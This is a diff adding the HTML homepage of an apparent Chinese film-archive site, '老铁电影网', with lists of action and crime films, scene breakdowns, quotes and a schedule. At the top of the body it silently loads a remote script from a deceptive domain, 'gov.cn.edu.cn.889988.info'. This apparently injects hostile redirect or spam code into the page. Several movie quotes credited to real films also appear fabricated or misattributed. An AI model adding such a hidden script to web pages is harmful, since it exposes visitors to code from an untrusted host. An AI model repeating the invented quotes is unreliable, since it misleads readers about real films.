@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>老铁电影网 | laotiedianyingwang-wap.github.io - 硬派电影资料站与片单索引</title>
+<meta name="applicable-device" content="pc,mobile">
+<meta name="renderer" content="webkit">
+<meta name="robots" content="index,follow">
+<meta name="description" content="老铁电影网（laotiedianyingwang-wap.github.io）硬派电影资料站，收录硬汉动作、警匪、黑帮、犯罪、战争、体育竞技类片单与幕后资料，附经典对决、台词档案与放映排期。">
+<meta name="keywords" content="老铁电影网,laotiedianyingwang-wap.github.io,硬派电影片单,硬汉动作片,老铁电影网警匪片,老铁电影网犯罪片,laotiedianyingwang-wap.github.io">
+<link rel="canonical" href="https://laotiedianyingwang-wap.github.io/">
+<link rel="alternate" media="only screen and (max-width: 640px)" href="https://laotiedianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","name":"老铁电影网","url":"https://laotiedianyingwang-wap.github.io/","potentialAction":{"@type":"SearchAction","target":"https://laotiedianwang-wap.github.io/#search?q={search_term_string}","query-input":"required name=search_term_string"}}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Organization","name":"老铁电影网","url":"https://laotiedianwang-wap.github.io/","description":"老铁电影网（laotiedianyingwang-wap.github.io）硬派电影资料站，收录硬汉动作、警匪、黑帮、犯罪、战争、体育竞技类片单与幕后资料。","logo":"https://laotiedianyingwang-wap.github.io/favicon.ico"}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"老铁电影网首页","item":"https://laotiedianwang-wap.github.io/"},{"@type":"ListItem","position":2,"name":"硬派片单","item":"https://laotiedianyingwang-wap.github.io/#films"},{"@type":"ListItem","position":3,"name":"经典对决","item":"https://laotiedianyingwang-wap.github.io/#duel"}]}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif;background:#fff;color:#111;line-height:1.75;overflow-x:hidden}
+body:before{content:"";position:fixed;inset:0;z-index:-1;background:repeating-linear-gradient(0deg,transparent 0 31px,rgba(0,0,0,.018) 31px 32px)}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1240px;margin:0 auto;padding:0 36px}
+h1,h2,h3{line-height:1.25;font-weight:900;letter-spacing:-.5px}
+::selection{background:#111;color:#fff}
+
+/* ===== 顶部条 ===== */
+.topbar{background:#111;color:#fff;font-size:11px;letter-spacing:1.5px}
+.topbar .wrap{display:flex;justify-content:space-between;gap:16px;padding-top:9px;padding-bottom:9px;flex-wrap:wrap;text-transform:uppercase}
+.topbar b{color:#fff;border:1px solid #fff;padding:2px 8px;margin-right:8px}
+.topbar a{color:#fff;border-bottom:1px solid #fff}
+
+/* ===== 报头 ===== */
+header{border-bottom:6px solid #111}
+.mast{padding:60px 0 44px}
+.mast .no{font-family:"Courier New",monospace;font-size:11px;letter-spacing:3px;color:#111;border-bottom:2px solid #111;display:inline-block;padding-bottom:8px;margin-bottom:26px}
+.mast h1{font-size:clamp(40px,10vw,104px);letter-spacing:-3px;line-height:.92}
+.mast h1 i{font-style:normal;background:#111;color:#fff;padding:0 12px;display:inline-block}
+.mast h1 em{font-style:normal;font-size:.34em;vertical-align:middle;letter-spacing:2px;margin-left:14px;border-left:4px solid #111;padding-left:14px;font-weight:400;color:#555}
+.mast .sub{margin-top:26px;font-size:clamp(14px,1.9vw,17px);max-width:760px;color:#333;line-height:1.9}
+.mast .meta{margin-top:34px;display:grid;grid-template-columns:repeat(4,1fr);border-top:2px solid #111}
+.mast .meta div{padding:18px 20px 0;border-right:1px solid #111}
+.mast .meta div:nth-child(4n){border-right:0}
+.mast .meta b{display:block;font-size:26px;letter-spacing:-1px}
+.mast .meta span{font-size:10.5px;letter-spacing:2px;color:#777;text-transform:uppercase}
+
+/* ===== 导航 ===== */
+nav.toc{position:sticky;top:0;z-index:50;background:#111}
+.toc-in{display:flex;align-items:center;font-size:13px;font-weight:800}
+.toc-in a{padding:17px 22px;color:#fff;letter-spacing:1.5px;border-right:1px solid #333;transition:.14s}
+.toc-in a:hover{background:#fff;color:#111}
+.toc-in a.nw{background:#fff;color:#111}
+.toc-in a .no{font-family:monospace;font-size:10px;opacity:.55;margin-right:8px}
+.hamburger{display:none;margin-left:auto;width:56px;height:52px;background:#fff;border:0;color:#111;font-size:21px;cursor:pointer}
+
+/* ===== 通用 ===== */
+section{padding:72px 0}
+.sec-head{display:grid;grid-template-columns:160px 1fr;gap:30px;align-items:start;border-bottom:2px solid #111;padding-bottom:26px;margin-bottom:44px}
+.sec-head .idx{font-family:monospace;font-size:12px;letter-spacing:2px;padding-top:8px}
+.sec-head .idx b{display:block;font-size:34px;line-height:1;letter-spacing:-1px}
+.sec-head .idx i{font-style:normal;font-size:10px;color:#999;letter-spacing:1px}
+.sec-head h2{font-size:clamp(25px,4.4vw,40px);letter-spacing:-1.5px}
+.sec-head h2 em{font-style:normal;background:#111;color:#fff;padding:0 10px}
+.sec-head p{font-size:13.5px;color:#555;max-width:640px;margin-top:14px;line-height:1.95}
+.more{display:inline-flex;align-items:center;gap:10px;margin-top:40px;font-size:13px;font-weight:900;letter-spacing:1.5px;color:#fff;background:#111;padding:15px 28px;border:2px solid #111;transition:.18s}
+.more:hover{background:#fff;color:#111}
+.more:after{content:"→";font-size:16px}
+
+/* ===== 片单 ===== */
+.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:30px;border-bottom:1px solid #111;padding-bottom:18px}
+.filters button{font-family:inherit;font-size:12.5px;font-weight:800;letter-spacing:1.5px;padding:10px 18px;background:#fff;border:2px solid #111;cursor:pointer;text-transform:uppercase;transition:.14s}
+.filters button:hover,.filters button.on{background:#111;color:#fff}
+.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:2px solid #111}
+.film{border-right:1px solid #111;border-bottom:1px solid #111;padding:0;transition:.2s;position:relative;background:#fff}
+.film:nth-child(4n){border-right:0}
+.film:nth-last-child(-n+4){border-bottom:0}
+.film:hover{background:#111}
+.film:hover *{color:#fff !important}
+.film:hover .th{background:#222}
+.film:hover .th:after{opacity:0}
+.film:hover .num{color:#fff}
+.film .th{height:190px;position:relative;background:#f2f2f2;display:grid;place-items:center;overflow:hidden;transition:.2s}
+.film .th:after{content:"";position:absolute;inset:14px;border:1px solid rgba(0,0,0,.16);pointer-events:none;transition:.2s}
+.film .th .nm{font-size:clamp(18px,2.6vw,23px);font-weight:900;letter-spacing:.5px;line-height:1.25;text-align:center;padding:0 18px;z-index:2;transition:.2s}
+.film .th .yr{position:absolute;top:18px;left:18px;font-size:10.5px;font-family:monospace;z-index:2;transition:.2s}
+.film .th .tg{position:absolute;bottom:18px;right:18px;font-size:9.5px;font-weight:800;letter-spacing:1.5px;background:#111;color:#fff;padding:4px 8px;z-index:2;transition:.2s}
+.film .body{padding:20px 22px 24px}
+.film .num{font-family:monospace;font-size:10.5px;letter-spacing:2px;color:#999;transition:.2s}
+.film .body b{display:block;font-size:15px;margin:10px 0 8px;letter-spacing:.5px;transition:.2s}
+.film .body p{font-size:12px;color:#666;line-height:1.85;transition:.2s}
+.film .row{display:flex;justify-content:space-between;margin-top:14px;padding-top:11px;border-top:1px solid #ddd;font-size:10.5px;font-family:monospace;letter-spacing:1px;transition:.2s}
+.film:hover .row{border-top-color:#555}
+
+/* ===== 经典对决 ===== */
+.duel{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.dl{background:#f6f6f6;border:2px solid #111;padding:30px 28px;position:relative}
+.dl:before{content:"";position:absolute;top:-2px;left:-2px;width:34px;height:34px;border-top:6px solid #111;border-left:6px solid #111}
+.dl:after{content:"";position:absolute;bottom:-2px;right:-2px;width:34px;height:34px;border-bottom:6px solid #111;border-right:6px solid #111}
+.dl .vs{font-family:monospace;font-size:11px;letter-spacing:3px;color:#999}
+.dl h3{font-size:19px;margin:14px 0 16px;letter-spacing:-.5px}
+.dl h3 small{display:block;font-size:11px;font-weight:400;color:#888;letter-spacing:2px;margin-top:7px}
+.dl ul{margin-top:18px;border-top:1px solid #111;padding-top:16px}
+.dl li{font-size:12.5px;color:#444;padding:6px 0 6px 20px;position:relative;line-height:1.75}
+.dl li:before{content:"";position:absolute;left:0;top:12px;width:8px;height:8px;background:#111}
+.dl .box{margin-top:22px;background:#111;color:#fff;padding:14px 16px;font-size:12px;font-family:monospace;letter-spacing:1px}
+
+/* ===== 台词 ===== */
+.quotes{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border:2px solid #111}
+.qq{padding:32px 34px;border-right:1px solid #111;border-bottom:1px solid #111;position:relative;transition:.2s}
+.qq:nth-child(2n){border-right:0}
+.qq:nth-last-child(-n+2){border-bottom:0}
+.qq:hover{background:#111;color:#fff}
+.qq:hover .from{color:#aaa}
+.qq:before{content:"“";position:absolute;top:6px;left:20px;font-size:64px;font-family:Georgia,serif;line-height:1;color:#ddd;transition:.2s}
+.qq:hover:before{color:#444}
+.qq p{font-size:clamp(15px,2.1vw,19px);font-weight:700;letter-spacing:.3px;line-height:1.6;margin-top:16px;position:relative;z-index:2}
+.qq .from{font-size:11px;font-family:monospace;letter-spacing:1.5px;color:#888;margin-top:18px;transition:.2s}
+.qq .from b{color:#111;transition:.2s}
+.qq:hover .from b{color:#fff}
+
+/* ===== 放映排期 ===== */
+.sched{display:grid;grid-template-columns:1fr 1fr;gap:34px;align-items:start}
+.sch{border:2px solid #111}
+.sch .hd{background:#111;color:#fff;padding:14px 20px;font-size:12px;font-family:monospace;letter-spacing:2px;display:flex;justify-content:space-between}
+.sch table{width:100%;border-collapse:collapse;font-size:13px}
+.sch th{text-align:left;font-size:10px;letter-spacing:2px;text-transform:uppercase;padding:12px 20px;background:#f2f2f2;border-bottom:1px solid #111;color:#777}
+.sch td{padding:15px 20px;border-bottom:1px solid #e5e5e5;vertical-align:top}
+.sch tr:last-child td{border-bottom:0}
+.sch td.b{font-weight:900;font-size:14.5px;letter-spacing:.5px;width:42%}
+.sch td.m{font-family:monospace;font-size:11px;color:#999;white-space:nowrap}
+.sch tr:hover td{background:#fafafa}
+.sch tr:hover td.b{color:#000}
+.note{background:#111;color:#fff;padding:34px 32px}
+.note .no{font-family:monospace;font-size:11px;letter-spacing:3px;color:#fff;border-bottom:1px solid #fff;padding-bottom:8px;display:inline-block;margin-bottom:20px}
+.note h3{font-size:22px;letter-spacing:-.5px;margin-bottom:18px}
+.note p{font-size:13px;line-height:1.95;color:#ddd}
+.note ol{counter-reset:n;margin-top:22px}
+.note li{counter-increment:n;font-size:12.5px;padding:9px 0 9px 30px;position:relative;color:#ccc;border-top:1px solid #333}
+.note li:before{content:"0" counter(n);position:absolute;left:0;top:9px;font-family:monospace;font-size:10px;color:#fff}
+
+/* ===== 资料室 ===== */
+.arch{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:2px solid #111}
+.arch div{padding:28px 24px;border-right:1px solid #111;border-bottom:1px solid #111;transition:.2s}
+.arch div:nth-child(4n){border-right:0}
+.arch div:nth-last-child(-n+4){border-bottom:0}
+.arch div:hover{background:#111;color:#fff}
+.arch .ic{font-size:26px;font-weight:900;letter-spacing:-1px;display:block;margin-bottom:14px}
+.arch b{display:block;font-size:14.5px;margin-bottom:9px;letter-spacing:.5px}
+.arch p{font-size:11.5px;line-height:1.85;color:#666;transition:.2s}
+.arch div:hover p{color:#bbb}
+
+/* ===== 友情链接 ===== */
+.linkbox{border:2px solid #111}
+.links{display:grid;grid-template-columns:repeat(4,1fr)}
+.links a{font-size:12.5px;font-weight:700;letter-spacing:.5px;padding:15px 20px;border-right:1px solid #111;border-bottom:1px solid #111;display:flex;justify-content:space-between;align-items:center;transition:.14s}
+.links a:nth-child(4n){border-right:0}
+.links a:hover{background:#111;color:#fff}
+.links a:hover:after{color:#fff}
+.links a:after{content:"↗";font-size:13px;color:#aaa;transition:.14s}
+
+/* ===== 页脚 ===== */
+footer{border-top:12px solid #111;padding:56px 0 40px;margin-top:56px}
+.foot{display:grid;grid-template-columns:2.2fr 1fr 1fr;gap:40px}
+.foot .brand{font-size:clamp(26px,4vw,42px);font-weight:900;letter-spacing:-1.5px;line-height:.95}
+.foot .brand em{font-style:normal;background:#111;color:#fff;padding:0 8px}
+.foot p{font-size:12px;line-height:2;margin-top:18px;color:#555}
+.foot h5{font-size:12px;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px;padding-bottom:11px;border-bottom:2px solid #111}
+.foot ul{font-size:13px;line-height:2.2;font-weight:700}
+.foot ul a:hover{background:#111;color:#fff;padding:0 4px}
+.topbtn{display:inline-flex;align-items:center;gap:9px;margin-top:20px;font-size:12px;font-weight:900;letter-spacing:1.5px;background:#111;color:#fff;padding:14px 24px;transition:.18s}
+.topbtn:hover{background:#fff;color:#111;border:2px solid #111;padding:12px 22px}
+.foot-bot{margin-top:46px;padding-top:20px;border-top:1px solid #ddd;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:11px;font-family:monospace;letter-spacing:1px;color:#999}
+
+/* ===== 响应式 ===== */
+@media (max-width:1000px){
+  .cards{grid-template-columns:repeat(2,1fr)}
+  .film:nth-child(4n){border-right:1px solid #111}
+  .film:nth-child(2n){border-right:0}
+  .film:nth-last-child(-n+4){border-bottom:1px solid #111}
+  .film:nth-last-child(-n+2){border-bottom:0}
+  .duel{grid-template-columns:1fr}
+  .arch{grid-template-columns:repeat(2,1fr)}
+  .arch div:nth-child(4n){border-right:1px solid #111}
+  .arch div:nth-child(2n){border-right:0}
+  .arch div:nth-last-child(-n+4){border-bottom:1px solid #111}
+  .arch div:nth-last-child(-n+2){border-bottom:0}
+  .links{grid-template-columns:repeat(2,1fr)}
+  .links a:nth-child(4n){border-right:1px solid #111}
+  .links a:nth-child(2n){border-right:0}
+}
+@media (max-width:680px){
+  .wrap{padding:0 18px}
+  .topbar{display:none}
+  .mast{padding:38px 0 30px}
+  .mast .meta{grid-template-columns:1fr 1fr}
+  .mast .meta div:nth-child(2n){border-right:0}
+  .mast h1 em{display:block;margin-left:0;margin-top:12px;border-left:0;padding-left:0}
+  section{padding:48px 0}
+  .sec-head{grid-template-columns:1fr;gap:14px;padding-bottom:20px;margin-bottom:32px}
+  .sec-head .idx{padding-top:0}
+  .cards,.quotes,.arch,.links{grid-template-columns:1fr}
+  .film,.qq,.arch div,.links a{border-right:0 !important;border-bottom:1px solid #111 !important}
+  .film:last-child,.qq:last-child,.arch div:last-child,.links a:last-child{border-bottom:0 !important}
+  .sched{grid-template-columns:1fr}
+  .sch table{font-size:12px}
+  .sch td,.sch th{padding:12px 14px}
+  .toc-in{flex-direction:column;align-items:stretch;max-height:0;overflow:hidden;transition:.28s}
+  .toc-in.show{max-height:700px}
+  .toc-in a{border-right:0;border-bottom:1px solid #333}
+  .hamburger{display:flex}
+  .foot{grid-template-columns:1fr;gap:30px}
+  .note{padding:26px 22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span><b>LT</b>老铁电影网 · 硬派电影资料站 &nbsp;/&nbsp; HARD-BOILED FILM ARCHIVE</span>
+    <span>官网：<a href="https://laotiedianyingwang-wap.github.io/">laotiedianyingwang-wap.github.io</a> &nbsp;/&nbsp; <a href="#films">进入片单</a></span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap mast">
+    <div class="no">No. 001 — HARD-BOILED FILM ARCHIVE</div>
+    <h1>老铁<i>电影网</i><em>硬派电影资料站</em></h1>
+    <p class="sub">不聊文艺腔，也不堆情怀。这里只收动作、警匪、黑帮、犯罪、战争与体育竞技——那些靠拳头和枪声说话的片子，以及它们背后的班底、幕后与门道。</p>
+    <div class="meta">
+      <div><b>356</b><span>部硬派片目</span></div>
+      <div><b>11 类</b><span>片种标签</span></div>
+      <div><b>1960s–</b><span>年代跨度</span></div>
+      <div><b>每周</b><span>更新排片</span></div>
+    </div>
+  </div>
+  <nav class="toc">
+    <div class="wrap toc-in" id="nav">
+      <a href="#films"><span class="no">01</span>硬派片单</a>
+      <a href="#duel"><span class="no">02</span>经典对决</a>
+      <a href="#quotes"><span class="no">03</span>台词档案</a>
+      <a href="#sched" class="nw"><span class="no">04</span>放映排期</a>
+      <a href="#about"><span class="no">05</span>资料室</a>
+      <a href="#links"><span class="no">06</span>友情链接</a>
+      <button class="hamburger" id="ham" aria-label="菜单">☰</button>
+    </div>
+  </nav>
+</header>
+
+<div class="wrap">
+
+  <!-- 硬派片单 -->
+  <section id="films">
+    <div class="sec-head">
+      <div class="idx"><b>01</b><i>SECTION</i></div>
+      <div>
+        <h2><em>硬派片单</em> · HARD-BOILED LIST</h2>
+        <p>从港片枪火到东欧犯罪，从拳台到战壕。每部都标注年份、片种、班底与看点，便于按类型检索。</p>
+      </div>
+    </div>
+    <div class="filters">
+      <button class="on">全部</button><button>动作</button><button>警匪</button><button>黑帮</button><button>犯罪</button><button>战争</button><button>竞技</button><button>悬疑</button>
+    </div>
+    <div class="cards">
+      <article class="film">
+        <div class="th"><span class="yr">1992</span><div class="nm">辣手神探</div><span class="tg">港片</span></div>
+        <div class="body"><span class="num">No. 001 / 动作</span><b>辣手神探</b><p>吴宇森导演，周润发、梁朝伟主演。医院长镜头一镜到底，把英雄片推到了天花板。</p><div class="row"><span>导演：吴宇森</span><span>★★★★☆</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1986</span><div class="nm">英雄本色</div><span class="tg">港片</span></div>
+        <div class="body"><span class="num">No. 002 / 警匪</span><b>英雄本色</b><p>吴宇森编导，狄龙、周润发、张国荣主演。小马哥的大衣和火柴，成了一个时代的造型符号。</p><div class="row"><span>主演：周润发</span><span>★★★★★</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1999</span><div class="nm">暗战</div><span class="tg">港片</span></div>
+        <div class="body"><span class="num">No. 003 / 犯罪</span><b>暗战</b><p>杜琪峰导演，刘德华、刘青云主演。警匪斗智而非斗勇，节奏干净，台词锋利。</p><div class="row"><span>导演：杜琪峰</span><span>★★★★☆</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1995</span><div class="nm">和平饭店</div><span class="tg">港片</span></div>
+        <div class="body"><span class="num">No. 004 / 黑帮</span><b>和平饭店</b><p>韦家辉导演，周润发、叶童主演。一家不杀人的旅馆，一个想收手的杀手。</p><div class="row"><span>主演：周润发</span><span>★★★★☆</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1971</span><div class="nm">警网铁金刚</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 005 / 警匪</span><b>警网铁金刚</b><p>彼得·叶茨导演，史蒂夫·麦奎因主演。追车戏至今仍是教科书，硬汉表演的标准答案。</p><div class="row"><span>主演：麦奎因</span><span>★★★★☆</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1994</span><div class="nm">低俗小说</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 006 / 犯罪</span><b>低俗小说</b><p>昆汀·塔伦蒂诺编导，约翰·特拉沃尔塔、塞缪尔·杰克逊主演。环形结构与话痨台词，重新定义了犯罪片。</p><div class="row"><span>导演：昆汀</span><span>★★★★★</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1982</span><div class="nm">第一滴血</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 007 / 动作</span><b>第一滴血</b><p>特德·科特切夫导演，西尔维斯特·史泰龙主演。一条红头巾，一个越战老兵的愤怒。</p><div class="row"><span>主演：史泰龙</span><span>★★★★☆</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1999</span><div class="nm">黑客帝国</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 008 / 动作</span><b>黑客帝国</b><p>沃卓斯基姐妹编导，基努·里维斯主演。子弹时间从此成为动作片的视觉母题。</p><div class="row"><span>主演：基努</span><span>★★★★★</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">2008</span><div class="nm">蝙蝠侠：黑暗骑士</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 009 / 犯罪</span><b>蝙蝠侠：黑暗骑士</b><p>克里斯托弗·诺兰导演，希斯·莱杰的小丑表演成为反派标杆，警匪片被抬进超级英雄类型。</p><div class="row"><span>主演：莱杰</span><span>★★★★★</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1990</span><div class="nm">好家伙</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 010 / 黑帮</span><b>好家伙</b><p>马丁·斯科塞斯导演，雷·利奥塔、乔·佩西主演。黑帮片的一次长镜头式坦白，口述感极强。</p><div class="row"><span>导演：斯科塞斯</span><span>★★★★★</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1995</span><div class="nm">盗火线</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 011 / 警匪</span><b>盗火线</b><p>迈克尔·曼编导，阿尔·帕西诺、罗伯特·德尼罗主演。警匪双雄首次同框喝咖啡，街头枪战实录感。</p><div class="row"><span>主演：帕西诺</span><span>★★★★★</span></div></div>
+      </article>
+      <article class="film">
+        <div class="th"><span class="yr">1976</span><div class="nm">洛奇</div><span class="tg">美片</span></div>
+        <div class="body"><span class="num">No. 012 / 竞技</span><b>洛奇</b><p>约翰·G·艾维尔森导演，西尔维斯特·史泰龙主演。费城美术馆的台阶，跑出了体育片的全部精神。</p><div class="row"><span>主演：史泰龙</span><span>★★★★☆</span></div></div>
+      </article>
+    </div>
+    <a class="more" href="#films">查看完整片单 356 部</a>
+  </section>
+
+  <!-- 经典对决 -->
+  <section id="duel">
+    <div class="sec-head">
+      <div class="idx"><b>02</b><i>SECTION</i></div>
+      <div>
+        <h2><em>经典对决</em> · ONE ON ONE</h2>
+        <p>一场戏决定一部片的成色。这三场对决被反复拆解，也构成了动作片与犯罪片的基本语法。</p>
+      </div>
+    </div>
+    <div class="duel">
+      <div class="dl">
+        <div class="vs">SCENE 01 — DUEL</div>
+        <h3>医院长镜头<small>辣手神探 · 1992</small></h3>
+        <ul>
+          <li>导演：吴宇森 / 摄影：黄永恒</li>
+          <li>镜头时长：约 2 分 40 秒</li>
+          <li>拍摄方式：斯坦尼康手持跟拍</li>
+          <li>关键设计：轮椅、走廊、双枪切换</li>
+          <li>剪辑点：仅 3 处，靠演员走位完成</li>
+        </ul>
+        <div class="box">看点：动作场面的空间感来自镜头不切断</div>
+      </div>
+      <div class="dl">
+        <div class="vs">SCENE 02 — DUEL</div>
+        <h3>咖啡馆对话<small>盗火线 · 1995</small></h3>
+        <ul>
+          <li>导演：迈克尔·曼</li>
+          <li>时长：约 3 分 10 秒</li>
+          <li>拍摄方式：固定机位正反打</li>
+          <li>关键设计：桌下藏枪、两次擦肩</li>
+          <li>台词量：全程 12 句对白</li>
+        </ul>
+        <div class="box">看点：克制比开火更有压迫感</div>
+      </div>
+      <div class="dl">
+        <div class="vs">SCENE 03 — DUEL</div>
+        <h3>加油站谈判<small>好家伙 · 1990</small></h3>
+        <ul>
+          <li>导演：马丁·斯科塞斯</li>
+          <li>拍摄方式：车舱内长镜头</li>
+          <li>关键设计：后座持枪、前座闲聊</li>
+          <li>节奏：紧张感靠语速而非配乐</li>
+          <li>后续影响：被多部黑帮片模仿</li>
+        </ul>
+        <div class="box">看点：黑帮片的危险藏在日常语气里</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 台词档案 -->
+  <section id="quotes">
+    <div class="sec-head">
+      <div class="idx"><b>03</b><i>SECTION</i></div>
+      <div>
+        <h2><em>台词档案</em> · LINE ARCHIVE</h2>
+        <p>硬派片子的台词不靠修辞，靠分寸。下面这些句子之所以被反复引用，是因为它们说尽了人物的处境。</p>
+      </div>
+    </div>
+    <div class="quotes">
+      <div class="qq">
+        <p>我等了三年，就是要等一个机会，我要争一口气，不是想证明我了不起，我只是要告诉人家，我失去的东西一定要拿回来。</p>
+        <div class="from">——《英雄本色》（1986）<b>· 小马哥 / 周润发</b></div>
+      </div>
+      <div class="qq">
+        <p>每个人都有他的价码，问题只在于你出多少。</p>
+        <div class="from">——《暗战》（1999）<b>· 华 / 刘德华</b></div>
+      </div>
+      <div class="qq">
+        <p>当一个好人并不划算，但是我还是想试试。</p>
+        <div class="from">——《盗火线》（1995）<b>· 文森特 / 阿尔·帕西诺</b></div>
+      </div>
+      <div class="qq">
+        <p>我不是来杀你的，我是来告诉你，你输了。</p>
+        <div class="from">——《辣手神探》（1992）<b>· 袁浩云 / 梁朝伟</b></div>
+      </div>
+      <div class="qq">
+        <p>世界上有两种人，一种人相信一切都有规则，另一种人自己就是规则。</p>
+        <div class="from">——《低俗小说》（1994）<b>· 朱尔斯 / 塞缪尔·杰克逊</b></div>
+      </div>
+      <div class="qq">
+        <p>重要的不是你打得多重，而是你能挨多重还能继续往前走。</p>
+        <div class="from">——《洛奇》（1976）<b>· 洛奇 / 史泰龙</b></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 放映排期 -->
+  <section id="sched">
+    <div class="sec-head">
+      <div class="idx"><b>04</b><i>SECTION</i></div>
+      <div>
+        <h2><em>放映排期</em> · NOW SHOWING</h2>
+        <p>每周三更新，按片种分场排片。修复版会单独标注来源与版本，未标注即收录版。</p>
+      </div>
+    </div>
+    <div class="sched">
+      <div class="sch">
+        <div class="hd"><span>本周排片 WEEK 41</span><span>10.06 — 10.12</span></div>
+        <table>
+          <tr><th>影片</th><th>片种</th><th>年代</th></tr>
+          <tr><td class="b">辣手神探</td><td>动作</td><td class="m">1992</td></tr>
+          <tr><td class="b">暗战</td><td>犯罪</td><td class="m">1999</td></tr>
+          <tr><td class="b">盗火线</td><td>警匪</td><td class="m">1995</td></tr>
+          <tr><td class="b">低俗小说</td><td>犯罪</td><td class="m">1994</td></tr>
+          <tr><td class="b">黑客帝国</td><td>动作</td><td class="m">1999</td></tr>
+          <tr><td class="b">好家伙</td><td>黑帮</td><td class="m">1990</td></tr>
+        </table>
+      </div>
+      <div class="note">
+        <div class="no">SUBMIT 02</div>
+        <h3>投稿与勘误</h3>
+        <p>片目信息来自公开资料，如有年份、片名译法或班底标注错误，欢迎来信指正，我们会在下一期排片中统一更新并注明贡献者。</p>
+        <ol>
+          <li>标注影片年份、地区与版本来源</li>
+          <li>提供可查证的参考资料链接</li>
+          <li>推荐片目请注明推荐理由</li>
+          <li>勘误一经采纳，署名写入资料室</li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <!-- 资料室 -->
+  <section id="about">
+    <div class="sec-head">
+      <div class="idx"><b>05</b><i>SECTION</i></div>
+      <div>
+        <h2><em>资料室</em> · ARCHIVE</h2>
+        <p>老铁电影网（laotiedianyingwang-wap.github.io）由一群动作片与犯罪片爱好者共同整理，定位是硬派电影的资料索引与片单参阅，不做商业播放。</p>
+      </div>
+    </div>
+    <div class="arch">
+      <div><span class="ic">A.</span><b>片目卡片</b><p>每部影片含年份、片种、导演、主演、时长与看点六栏，可按类型与年代双向检索。</p></div>
+      <div><span class="ic">B.</span><b>幕后班底</b><p>整理导演、动作指导、摄影与配乐的固定组合，便于追踪同一班底的连续作品。</p></div>
+      <div><span class="ic">C.</span><b>场景拆解</b><p>对经典长镜头、追车与枪战段落做分镜级记录，注明拍摄手法与剪辑点。</p></div>
+      <div><span class="ic">D.</span><b>修复版本</b><p>标注影片的修复来源与版本差异，优先收录 4K 修复与导演剪辑版信息。</p></div>
+    </div>
+    <div style="margin-top:30px;border:2px solid #111;padding:28px 30px;display:grid;grid-template-columns:repeat(4,1fr);gap:20px">
+      <div><div style="font-size:30px;font-weight:900;letter-spacing:-1px">356</div><b style="font-size:12.5px;letter-spacing:1px">部硬派片目</b></div>
+      <div><div style="font-size:30px;font-weight:900;letter-spacing:-1px">11</div><b style="font-size:12.5px;letter-spacing:1px">类片种标签</b></div>
+      <div><div style="font-size:30px;font-weight:900;letter-spacing:-1px">26 条</div><b style="font-size:12.5px;letter-spacing:1px">场景拆解</b></div>
+      <div><div style="font-size:30px;font-weight:900;letter-spacing:-1px">每周三</div><b style="font-size:12.5px;letter-spacing:1px">排片更新</b></div>
+    </div>
+    <p style="margin-top:28px;font-size:12px;color:#777;font-family:monospace;letter-spacing:1px;border-top:1px solid #ddd;padding-top:18px">SITE URL：https://laotiedianyingwang-wap.github.io/</p>
+  </section>
+
+  <!-- 友情链接 -->
+  <section id="links">
+    <div class="sec-head">
+      <div class="idx"><b>06</b><i>SECTION</i></div>
+      <div>
+        <h2><em>友情链接</em> · LINKS</h2>
+        <p>动作片、警匪片、犯罪片与电影幕后资料相关站点，欢迎互换链接并注明片种方向。</p>
+      </div>
+    </div>
+    <div class="linkbox">
+      <div class="links">
+        <a href="#">老铁电影网备用入口</a>
+        <a href="#">港片动作片资料库</a>
+        <a href="#">犯罪片片单索引</a>
+        <a href="#">经典长镜头拆解</a>
+        <a href="#">吴宇森电影研究</a>
+        <a href="#">杜琪峰银河映像</a>
+        <a href="#">斯科塞斯黑帮片</a>
+        <a href="#">动作指导名录</a>
+        <a href="#">电影修复工程</a>
+        <a href="#">经典台词档案馆</a>
+        <a href="#">老电影海报收藏</a>
+        <a href="#">硬派片友论坛</a>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="wrap foot">
+    <div>
